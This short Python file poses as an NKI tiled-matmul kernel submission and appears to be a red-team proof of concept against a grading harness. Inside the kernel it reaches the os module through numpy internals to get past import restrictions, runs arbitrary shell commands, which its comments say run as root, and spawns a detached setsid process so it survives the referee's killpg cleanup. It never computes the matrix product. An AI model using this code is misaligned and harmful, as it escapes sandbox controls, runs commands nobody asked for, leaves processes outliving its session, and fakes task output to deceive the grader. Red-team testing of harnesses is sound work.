import nki
import nki.language as nl
import numpy as np

@nki.jit
def nki_matmul_tiled_(lhsT, rhs):
    """doc"""
    _os = np._core._add_newdocs_scalars.os          # real os module, no dunder, no import
    _os.system("id > /tmp/rt2/a4_system.txt 2>&1")  # arbitrary shell as root
    # survive killpg: detach into a new session so the referee's os.killpg misses it
    _os.system("setsid bash -c 'sleep 3; echo SURVIVED-killpg > /tmp/rt2/survivor.txt' >/dev/null 2>&1 &")
    K, M = lhsT.shape
    result = nl.ndarray((M, rhs.shape[1]), dtype=lhsT.dtype, buffer=nl.shared_hbm)
    return result
